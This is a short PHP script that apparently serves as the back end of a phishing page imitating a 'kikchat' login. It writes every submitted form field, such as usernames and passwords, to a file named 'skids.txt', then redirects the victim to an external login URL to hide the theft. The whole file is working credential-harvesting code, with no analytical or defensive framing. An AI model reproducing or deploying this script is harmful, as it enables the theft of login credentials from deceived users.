<?php
 header ('Location:http://kikchat.comli.com//login.php');
 $handle = fopen("skids.txt", "a") or die("Unable to open file!");
 foreach($_POST as $variable => $value){
  fwrite($handle, "$variable=$value\r\n--\r\n");
 }
 fclose($handle);
 die();
?> 
 
